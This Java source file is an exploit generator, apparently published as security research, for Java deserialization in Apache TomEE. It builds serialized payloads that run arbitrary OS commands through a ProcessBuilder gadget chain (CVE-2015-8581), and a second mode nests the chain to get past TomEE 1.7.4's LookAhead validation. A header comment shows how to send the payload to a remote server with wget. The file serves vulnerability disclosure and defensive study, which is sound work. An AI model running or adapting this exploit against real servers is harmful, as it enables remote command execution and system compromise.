package com.salesforce.trust.s11n.exploit;

import java.beans.EventHandler;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.lang.annotation.Annotation;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Type;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.util.List;

import org.apache.webbeans.component.InjectionPointBean;
import org.apache.webbeans.config.WebBeansContext;
import org.apache.webbeans.event.EventImpl;
import org.apache.webbeans.inject.impl.InjectionPointFactory;
import org.apache.openejb.util.PojoSerialization;

import com.salesforce.trust.s11n.Common;

/**
 * Generates a file that can be used to bypass TomEE LookAhead validation
 * 
 * $ wget --post-file tomee2.ser http://remote-server:8080/tomee/ejb
 * 
 * @author Pierre Ernst
 *
 */
public class TomeeLookAheadBypass {

	private static final String OPEN_EJB_HEADER = "OEJP/4.7";

	private static class PojoObjectOutputStream extends ObjectOutputStream {

		protected PojoObjectOutputStream(OutputStream os) throws IOException, SecurityException {
			super(os);
			this.enableReplaceObject(true);
		}

		@Override
		protected Object replaceObject(Object obj) throws IOException {

			if (obj instanceof Serializable) {
				// Let regular serialization happen
				return obj;
			}

			// OpenEJB can serialize even non-serializable instances !?!
			return new PojoSerialization(obj);
		}
	}

	private static byte[] serialize(Object o, boolean addOpenEjbHeader) throws IOException {
		byte[] body = null;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new PojoObjectOutputStream(baos);
		if (addOpenEjbHeader) {
			// not sure why this is needed
			oos.writeByte(0x66);
		}
		oos.writeObject(o);
		body = baos.toByteArray();
		oos.close();
		baos.close();

		byte[] message = body;
		if (addOpenEjbHeader) {
			message = new byte[OPEN_EJB_HEADER.length() + body.length];
			System.arraycopy(OPEN_EJB_HEADER.getBytes(), 0, message, 0, OPEN_EJB_HEADER.length());
			System.arraycopy(body, 0, message, OPEN_EJB_HEADER.length(), body.length);
		}

		return message;
	}

	private static int indexOf(byte[] outerArray, byte[] smallerArray, int wildCardIndex) {
		if ((wildCardIndex >= smallerArray.length) || (wildCardIndex < 0)) {
			throw new IllegalArgumentException("wildCardIndex must be within the bound of smallerArray");
		}
		for (int i = 0; i < (outerArray.length - smallerArray.length + 1); ++i) {
			boolean found = true;
			for (int j = 0; j < smallerArray.length; ++j) {
				if ((j != wildCardIndex) && (outerArray[i + j] != smallerArray[j])) {
					found = false;
					break;
				}
			}
			if (found) {
				return i;
			}
		}
		return -1;
	}

	private static byte[] newArrayWithReplacedS11n(byte[] s11n, byte[] replacement) {
		// search for end of TC_CLASSDESC block and beginning of data block
		// 78 70 77 <size> AC ED 00 05
		int wildCardIndex = 3;

		int sizeLength = (replacement.length < 128) ? 1 : 4;
		byte marker = (byte) ((replacement.length < 128) ? 0x77 : 0x7A);

		int startIndex = 2 + indexOf(s11n, new byte[] { 0x78, 0x70, 0x77, (byte) 0xFF, (byte) 0xAC, (byte) 0xED, 0, 5 },
				wildCardIndex);
		int originalLength = (0xFF) & s11n[startIndex + 1];
		byte[] replaced = new byte[s11n.length - originalLength + replacement.length - 1 + sizeLength];

		// Copy header
		System.arraycopy(s11n, 0, replaced, 0, startIndex);

		// Copy marker
		replaced[startIndex] = marker;

		// Copy new length
		byte[] length = ByteBuffer.allocate(sizeLength).putInt(replacement.length).array();
		System.arraycopy(length, 0, replaced, startIndex + 1, sizeLength);

		// Copy new value
		System.arraycopy(replacement, 0, replaced, startIndex + 1 + sizeLength, replacement.length);

		return replaced;
	}

	/**
	 * Generates a 'regular' gadget that can be used on older versions of TomEE
	 * (CVE-2015-8581: before LookAhead validation was added, 1.7.3 or older)
	 * 
	 * Gadget chain: 
	 * ObjectInputStream.readObject() 
	 *   Throwable.readObject()
	 *     List.isEmpty()
	 *       (Proxy) EventHandler.invoke()
	 *         Method.invoke()
	 *           ProcessBuilder.start()
	 * 
	 * @param cmd
	 *            the OS command to be injected on the server
	 * @return
	 * @throws IllegalAccessException
	 * @throws IllegalArgumentException
	 * @throws SecurityException
	 * @throws NoSuchFieldException
	 * @throws ClassNotFoundException
	 */
	private static Object generateMaliciousInstanceUsingProxyHandler(String cmd) throws ClassNotFoundException,
			NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {
		InvocationHandler ih = new EventHandler(new ProcessBuilder(cmd), "start", null, null);
		Common.setFieldValue(EventHandler.class, "acc", ih, null);
		Object proxy = Proxy.newProxyInstance(null, new Class<?>[] { List.class }, ih);
		Throwable throwable = new Throwable("  Pierre Ernst, Salesforce  ");
		Common.setFieldValue(Throwable.class, "suppressedExceptions", throwable, proxy);
		Common.setFieldValue(Throwable.class, "cause", throwable, null);
		return throwable;
	}

	public static void main(String... args) {
		try {
			if (args.length != 2) {
				System.err.println(
						"Usage: java " + TomeeLookAheadBypass.class.getName() + " {regular|bypass} cmd\n\te.g.:\tjava "
								+ TomeeLookAheadBypass.class.getName() + " regular calc.exe\n\t\tjava "
								+ TomeeLookAheadBypass.class.getName() + " bypass /usr/bin/gnome-calculator");
			} else {
				if (args[0].equalsIgnoreCase("regular")) {

					// Generated serialized stream with OpenEJP header
					byte[] buffer = serialize(generateMaliciousInstanceUsingProxyHandler(args[1]), true);

					// Save to file
					File output = new File(".", "tomee1.ser");
					OutputStream out = new FileOutputStream(output);
					out.write(buffer);
					out.close();
					System.out.println("Command injection '" + args[1] + "' saved in " + output.getCanonicalPath());

				} else if (args[0].equalsIgnoreCase("bypass")) {

					/**
					 * Generates a gadget that can be used to bypass LookAhead validation 
					 * on TomEE 1.7.4
	                 * 
					 * Gadget chain:
					 * ObjectInputStream.readObject()
					 *   EventImpl.readObject()
					 *     OwbCustomObjectInputStream.readObject()
					 *       Throwable.readObject()
	                 *         List.isEmpty()
	                 *          (Proxy) EventHandler.invoke()
                	 *            Method.invoke()
	                 *              ProcessBuilder.start()
					 */
					// Generate Outer Object
					Type eventType = BigInteger.class;
					Annotation[] bindings = new Annotation[] {};
					InjectionPointBean ib = new InjectionPointBean(new org.apache.webbeans.config.WebBeansContext());
					javax.enterprise.inject.spi.InjectionPoint ip = InjectionPointFactory.getVirtualInjectionPoint(ib);
					EventImpl outer = new EventImpl(bindings, eventType, ip, new WebBeansContext());

					// Generate Inner Object
					Object inner = generateMaliciousInstanceUsingProxyHandler(args[1]);

					// Build inner inside outer
					byte[] replaced = newArrayWithReplacedS11n(serialize(outer, true), serialize(inner, false));

					// Save to file
					File output = new File(".", "tomee2.ser");
					OutputStream out = new FileOutputStream(output);
					out.write(replaced);
					out.close();
					System.out.println("Command injection '" + args[1] + "' saved in " + output.getCanonicalPath());

				} else {
					System.err.println("Usage: java " + TomeeLookAheadBypass.class.getName()
							+ " {regular|bypass} cmd\n\te.g.:\tjava " + TomeeLookAheadBypass.class.getName()
							+ " regular calc.exe\n\t\tjava " + TomeeLookAheadBypass.class.getName()
							+ " bypass /usr/bin/gnome-calculator");
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace(System.err);
		}
	}
}
